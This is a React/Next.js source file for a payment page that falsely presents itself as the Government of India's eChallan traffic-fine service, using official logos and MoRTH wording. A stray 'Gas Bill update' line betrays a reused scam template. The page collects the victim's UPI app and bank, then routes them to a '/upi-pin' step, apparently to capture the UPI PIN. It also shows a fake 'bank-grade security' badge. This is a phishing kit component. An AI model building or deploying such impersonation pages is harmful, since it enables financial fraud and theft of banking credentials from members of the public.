"use client";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { ChevronRight } from "lucide-react";

export default function UpiPaymentPage() {
  const [bank, setBank] = useState("");
  const [upiApp, setUpiApp] = useState("");
  const router = useRouter();

  const upiApps = [
    "Paytm",
    "Google Pay",
    "PhonePe",
    "Amazon Pay",
    "BHIM UPI",
    "MobiKwik",
    "Freecharge",
    "Others",
  ];

  // const banks = ["SBI", "HDFC", "ICICI", "Axis", "Kotak"];
  const banks = [
    "State Bank of India (SBI)",
    "HDFC Bank",
    "ICICI Bank",
    "Axis Bank",
    "Kotak Mahindra Bank",
    "Punjab National Bank (PNB)",
    "Bank of Baroda (BoB)",
    "Canara Bank",
    "Union Bank of India",
    "Indian Bank",
    "Central Bank of India",
    "Bank of India (BoI)",
    "IDFC First Bank",
    "Yes Bank",
    "IndusInd Bank",
    "Federal Bank",
    "South Indian Bank (SIB)",
    "Karur Vysya Bank (KVB)",
    "RBL Bank",
    "UCO Bank",
    "Indian Overseas Bank (IOB)",
    "Bandhan Bank",
    "Jammu & Kashmir Bank (J&K Bank)",
    "City Union Bank (CUB)",
  ];

  const handleContinue = () => {
    if (!upiApp || !bank) return;
    // Navigate with query params
    router.push(`/upi-pin?upiApp=${upiApp}&bank=${bank}`);
  };

  const [amount, setAmount] = useState("10");
  useEffect(() => {
    const storedAmount = localStorage.getItem("amount");
    if (storedAmount) {
      setAmount(storedAmount);
    }
  }, []);

  return (
    <div className="">
      {/* UPI Apps */}
      <div className="">
        <div className="flex flex-col justify-center items-center px-5 py-10 bg-[#003466]">
          {/* Logo */}
          <img
            src="/Government-of-India-Logo-Vector-PNG.png"
            className="w-10"
            alt="Logo"
          />
          <h1 className="text-white text-base font-bold mt-5">भारत सरकार</h1>
          <h1 className="text-white text-base font-bold mt-1">
            Government of India
          </h1>
          <h1 className="text-white text-base font-bold mt-5 text-center">
            eChallan - Digital Traffic/Transport Enforcement Solution
          </h1>
          <span className="text-white text-xs mt-5 text-center">
            An initiative of MoRTH, Goverment Of India
          </span>
        </div>

        <div className="text-center py-6 border-b">
          <p className="text-black">Amount to Pay</p>
          <h2 className="text-3xl font-bold text-black">₹{amount}.00</h2>
          <p className="text-gray-500 text-sm mt-1">
            Secure payment to Gas Bill update
          </p>
        </div>

        <div className="bg-white/10 backdrop-blur-sm rounded-2xl p-6">
          <div className=" flex flex-col gap-4">
            <h3 className="text-lg font-semibold text-black">Choose UPI App</h3>
            <div className="grid grid-cols-2 gap-3">
              {upiApps.map((app, idx) => (
                <button
                  key={idx}
                  onClick={() => setUpiApp(app)}
                  className={`border rounded-lg py-3 text-center font-medium hover:bg-gray-100 ${
                    upiApp === app
                      ? "border-[#003466] text-black"
                      : "text-gray-600"
                  }`}
                >
                  {app}
                </button>
              ))}
            </div>

            {/* Bank Select */}
            <h3 className="text-lg font-semibold mt-6 text-white">
              Select Bank
            </h3>
            <select
              value={bank}
              onChange={(e) => setBank(e.target.value)}
              className="w-full border rounded-lg p-3"
            >
              <option value="">Choose your bank</option>
              {banks.map((b, idx) => (
                <option key={idx} value={b}>
                  {b}
                </option>
              ))}
            </select>
          </div>

          {/* <button
            onClick={handleContinue}
            className={`w-full bg-gradient-to-r from-blue-600 to-blue-200/20 text-white font-semibold py-4 rounded-xl transition-colors duration-200 text-lg tracking-wide border-2 border-white border-opacity-30 mt-5`}
            //   disabled={!upiApp || !bank}
          >
            Continue to PIN
          </button> */}
          <div className="w-auto flex justify-end items-center mt-5">
            <button
              className="bg-gradient-to-r from-[#003466] to-[#003466] text-white uppercase rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto"
              onClick={handleContinue}
            >
              Continue to PIN
            </button>
          </div>
        </div>
      </div>

      {/* Bottom Button */}
      <div className="mt-auto p-4">
        <p className="text-center text-[#003466] text-xs mt-3">
          🔒 256-bit SSL encrypted & bank-grade security
        </p>
      </div>
    </div>
  );
}
